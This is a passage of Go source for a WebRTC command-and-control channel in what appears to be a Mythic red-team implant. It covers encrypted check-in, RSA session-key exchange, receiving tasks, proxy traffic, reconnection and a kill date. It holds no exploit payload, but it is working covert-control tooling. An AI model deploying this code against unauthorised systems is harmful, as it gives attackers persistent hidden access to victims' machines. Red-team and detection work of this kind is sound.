	if localICEComplete && remoteICEComplete {
		return
	}

	timeout := time.After(2 * time.Second)
	for !localICEComplete || !remoteICEComplete {
		select {
		case <-localICECompleteChan:
			localICEComplete = true
		case <-remoteICECompleteChan:
			remoteICEComplete = true
		case <-timeout:
			utils.PrintDebug(fmt.Sprintf("Continuing after ICE completion grace period; local=%t remote=%t", localICEComplete, remoteICEComplete))
			return
		}
	}
}

func (c *C2WebRTC) handleConnectionTimeout(candidatesProcessed int, localICECompleteChan chan struct{}, remoteICECompleteChan chan struct{}, localICEComplete bool, remoteICEComplete bool) error {
	if c.isDataChannelReady() {
		utils.PrintDebug("Data channel ready at timeout, proceeding")
		c.sendConnectedMessage()
		c.waitForICECompletion(localICECompleteChan, remoteICECompleteChan, localICEComplete, remoteICEComplete)
		return nil
	}

	return fmt.Errorf(
		"timeout waiting for data channel to be ready after %s (candidates_processed=%d local_ice_complete=%t remote_ice_complete=%t %s)",
		webRTCDefaultICEConnectionTimeout,
		candidatesProcessed,
		localICEComplete,
		remoteICEComplete,
		c.connectionStateSummary(),
	)
}

func (c *C2WebRTC) isExpectedConnectionError(err error) bool {
	errStr := err.Error()
	return strings.Contains(errStr, "use of closed network connection") ||
		strings.Contains(errStr, "websocket: close")
}

func (c *C2WebRTC) SendMessage(output []byte) []byte {
	if c.ShouldStop {
		utils.PrintDebug("Client is stopping, message not sent")
		return nil
	}

	c.sendDataNoResponse(output)
	return nil
}

func (c *C2WebRTC) sendDataNoResponse(sendData []byte) {
	if !c.isDataChannelReady() {
		utils.PrintDebug("Data channel not ready for async send")
		c.requestReconnect("Data channel not ready for async send")
		return
	}

	isBulkProxyMessage := isProxyOnlyMythicPayload(sendData)
	message, err := c.prepareMessage(sendData)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to prepare async message: %v", err))
		return
	}

	c.Lock.RLock()
	writer := c.dataWriter
	c.Lock.RUnlock()

	if writer == nil {
		utils.PrintDebug("Data channel writer not ready after preparing async message")
		c.requestReconnect("Data channel writer missing for async send")
		return
	}

	if err := writer.Enqueue(message, isBulkProxyMessage); err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to queue async message: %v", err))
		c.requestReconnect("Data channel enqueue failed")
	}
}

func isProxyOnlyMythicPayload(sendData []byte) bool {
	envelope := make(map[string]json.RawMessage)
	if err := json.Unmarshal(sendData, &envelope); err != nil {
		return false
	}

	_, hasSocks := envelope["socks"]
	_, hasRpfwd := envelope["rpfwd"]
	if !hasSocks && !hasRpfwd {
		return false
	}

	for _, highPriorityField := range []string{"responses", "delegates", "edges", "interactive", "alerts"} {
		if _, ok := envelope[highPriorityField]; ok {
			return false
		}
	}
	return true
}

func (c *C2WebRTC) prepareMessage(sendData []byte) ([]byte, error) {
	if len(c.Key) != 0 {
		sendData = c.encryptMessage(sendData)
	}

	if GetMythicID() != "" {
		sendData = append([]byte(GetMythicID()), sendData...)
	} else {
		sendData = append([]byte(UUID), sendData...)
	}

	message := structs.Message{
		Data: base64.StdEncoding.EncodeToString(sendData),
	}

	return json.Marshal(message)
}

func (c *C2WebRTC) processMessage(data []byte) {
	utils.PrintDebug(fmt.Sprintf("processMessage - Received data of length: %d", len(data)))

	var messageWrapper structs.Message
	if err := json.Unmarshal(data, &messageWrapper); err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling message: %v", err))
		return
	}

	decodedData, err := base64.StdEncoding.DecodeString(messageWrapper.Data)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error decoding base64 data: %v", err))
		return
	}

	if len(decodedData) < 36 {
		utils.PrintDebug("Message data too short")
		return
	}

	payload := decodedData[36:]
	if len(c.Key) != 0 {
		payload = c.decryptMessage(payload)
		if len(payload) == 0 {
			utils.PrintDebug("Failed to decrypt message")
			return
		}
	}

	utils.PrintDebug(fmt.Sprintf("processMessage - Decrypted payload length: %d", len(payload)))
	utils.PrintDebug(fmt.Sprintf("processMessage - Decrypted payload: %s", payload))

	c.handleIncomingMessage(payload)
}

func (c *C2WebRTC) handleIncomingMessage(payload []byte) {
	if c.finishedStaging {
		taskResp := structs.MythicMessageResponse{}
		if err := json.Unmarshal(payload, &taskResp); err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to unmarshal message into MythicResponse: %v", err))
			return
		}
		utils.PrintDebug("Received task message from server - processing via push channel")
		responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
	} else {
		if c.ExchangingKeys {
			if c.finishNegotiateKey(payload) {
				utils.PrintDebug("Key exchange completed, proceeding with checkin")
				c.CheckIn()
			} else {
				utils.PrintDebug("Key exchange failed, retrying")
				c.NegotiateKey()
			}
		} else {
			checkinResp := structs.CheckInMessageResponse{}
			if err := json.Unmarshal(payload, &checkinResp); err != nil {
				utils.PrintDebug(fmt.Sprintf("handleIncomingMessage - Error unmarshaling checkin response: %v", err))
				return
			}

			if checkinResp.Status == "success" {
				SetMythicID(checkinResp.ID)
				c.finishedStaging = true
				c.ExchangingKeys = false
				utils.PrintDebug(fmt.Sprintf("Checkin successful - Agent ID: %s, ready for push tasks", checkinResp.ID))
			} else {
				utils.PrintDebug(fmt.Sprintf("Failed to checkin, got: %s", string(payload)))
			}
		}
	}
}

func (c *C2WebRTC) isDataChannelReady() bool {
	c.Lock.RLock()
	defer c.Lock.RUnlock()
	return c.DataChannel != nil && c.DataChannel.ReadyState() == webrtc.DataChannelStateOpen
}

func (c *C2WebRTC) CheckIn() structs.CheckInMessageResponse {
	checkin := CreateCheckinMessage()
	checkinMsg, err := json.Marshal(checkin)
	if err != nil {
		utils.PrintDebug("error trying to marshal checkin data\n")
	}

	if c.ShouldStop {
		utils.PrintDebug("got shouldStop in checkin\n")
		return structs.CheckInMessageResponse{}
	}

	if c.ExchangingKeys {
		utils.PrintDebug("Negotiating encryption key")
		for !c.NegotiateKey() {
			utils.PrintDebug("failed to negotiate key, trying again\n")
			if c.ShouldStop {
				utils.PrintDebug("got shouldStop while negotiateKey\n")
				return structs.CheckInMessageResponse{}
			}
		}
	}

	utils.PrintDebug(fmt.Sprintf("Checkin msg: %v", checkinMsg))
	c.SendMessage(checkinMsg)
	time.Sleep(2 * time.Second)

	utils.PrintDebug("Push mode: Checkin sent, response will come asynchronously")
	return structs.CheckInMessageResponse{
		Status: "success",
		ID:     "pending",
	}
}

func (c *C2WebRTC) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.rsaPrivateKey = priv

	initMessage := structs.EkeKeyExchangeMessage{
		Action:    "staging_rsa",
		SessionID: sessionID,
		PubKey:    base64.StdEncoding.EncodeToString(pub),
	}

	raw, err := json.Marshal(initMessage)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error marshaling data: %s", err.Error()))
		return false
	}

	c.SendMessage(raw)
	return true
}

func (c *C2WebRTC) finishNegotiateKey(resp []byte) bool {
	var sessionKeyResp structs.EkeKeyExchangeMessageResponse

	if err := json.Unmarshal(resp, &sessionKeyResp); err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
		return false
	}

	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID)
	} else {
		utils.PrintDebug("No UUID received in finishNegotiateKey response")
		return false
	}

	encryptedSessionKey, err := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error decoding session key: %s", err.Error()))
		return false
	}

	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.rsaPrivateKey)
	if len(decryptedKey) == 0 {
		utils.PrintDebug("Failed to decrypt session key")
		return false
	}

	c.Key = base64.StdEncoding.EncodeToString(decryptedKey)
	c.ExchangingKeys = false
	c.finishedStaging = true
	SetAllEncryptionKeys(c.Key)

	utils.PrintDebug("Successfully finished key negotiation")
	return true
}

func (c *C2WebRTC) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2WebRTC) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}

func (c *C2WebRTC) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.ExchangingKeys = false
}

func (c *C2WebRTC) UpdateConfig(parameter string, value string) {
	changingConnectionParameter := false

	switch parameter {
	case "SignalingServer":
		c.SignalingServer = value
		changingConnectionParameter = true
	case "AuthKey":
		c.AuthKey = value
		changingConnectionParameter = true
	case "TurnServer":
		c.TurnServer = value
		changingConnectionParameter = true
	case "TurnUsername":
		c.TurnUsername = value
		changingConnectionParameter = true
	case "TurnPassword":
		c.TurnPassword = value
		changingConnectionParameter = true
	case "UserAgent":
		c.UserAgent = value
		changingConnectionParameter = true
	case "EncryptionKey":
		c.Key = value
		SetAllEncryptionKeys(c.Key)
	case "Endpoint":
		c.Endpoint = value
	case "Killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		if killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString); err == nil {
			c.killdate = killDateTime
		}
	}

	if changingConnectionParameter {
		c.Stop()
		go c.Start()
	}
}

func (c *C2WebRTC) beginReconnect() bool {
	c.reconnectLock.Lock()
	defer c.reconnectLock.Unlock()

	if c.reconnecting {
		return false
	}
	c.reconnecting = true
	return true
}

func (c *C2WebRTC) endReconnect() {
	c.reconnectLock.Lock()
	c.reconnecting = false
	c.reconnectLock.Unlock()
}

func (c *C2WebRTC) isReconnecting() bool {
	c.reconnectLock.Lock()
	defer c.reconnectLock.Unlock()
	return c.reconnecting
}

func (c *C2WebRTC) requestReconnect(reason string) {
	if c.ShouldStop {
		return
	}
	if c.isReconnecting() {
		utils.PrintDebug(fmt.Sprintf("Skipping reconnect request while reconnecting: %s", reason))
		return
	}
	utils.PrintDebug(reason)
	go c.reconnect()
}

func (c *C2WebRTC) reconnectBackoff(attempt int) time.Duration {
	backoff := webRTCDefaultReconnectInitialBackoff
	maxBackoff := webRTCDefaultReconnectMaxBackoff
	if backoff > maxBackoff {
		return maxBackoff
	}

	for i := 0; i < attempt; i++ {
		backoff *= 2
		if backoff >= maxBackoff {
			return maxBackoff
		}
	}
	return backoff
}

func (c *C2WebRTC) reconnect() {
	if c.ShouldStop {
		utils.PrintDebug("Got shouldStop in reconnect")
		return
	}

	if !c.beginReconnect() {
		utils.PrintDebug("Reconnect already in progress")
		return
	}
	defer c.endReconnect()

	c.closeConnections()

	c.Lock.Lock()
	c.DataChannel = nil
	c.Lock.Unlock()

	utils.PrintDebug("Reconnecting to signaling server")

	for i := 0; i < webRTCDefaultReconnectMaxRetries; i++ {
		if c.ShouldStop {
			return
		}

		if err := c.establishConnection(); err != nil {
			utils.PrintDebug(fmt.Sprintf("Reconnection attempt %d failed: %v", i+1, err))
			time.Sleep(c.reconnectBackoff(i))
			continue
		}

		if err := c.waitForDataChannelReady(); err != nil {
			utils.PrintDebug(fmt.Sprintf("Data channel setup failed on reconnect: %v", err))
			time.Sleep(c.reconnectBackoff(i))
			continue
		}

		utils.PrintDebug("Reconnected successfully")
		c.closeSignalingConnection()
		return
	}

	utils.PrintDebug("Failed to reconnect after multiple attempts")
}

func (c *C2WebRTC) startDataChannelListener() {
	if err := c.waitForDataChannelReady(); err != nil {
		utils.PrintDebug(fmt.Sprintf("Data channel never became ready: %v", err))
		return
	}

	if c.ExchangingKeys {
		c.NegotiateKey()
	} else {
		c.CheckIn()
	}

	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for !c.ShouldStop {
		select {
		case <-ticker.C:
			if c.isReconnecting() {
				continue
			}

			c.Lock.RLock()
			dataChannel := c.DataChannel
			c.Lock.RUnlock()

			if dataChannel == nil || dataChannel.ReadyState() == webrtc.DataChannelStateClosed {
				c.requestReconnect("Data channel actually closed, reconnecting")
			}
		}
	}
}

func (c *C2WebRTC) CreateMessagesForEgressConnections() {
	for {
		msg := <-c.PushChannel
		raw, err := json.Marshal(msg)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to marshal message to Mythic: %v\n", err))
			continue
		}
		utils.PrintDebug(fmt.Sprintf("Sending message outbound to WebRTC: %v\n", msg))
		c.SendMessage(raw)
	}
}

func boolPtr(b bool) *bool {
	return &b
}

func stringPtr(s string) *string {
	return &s
}
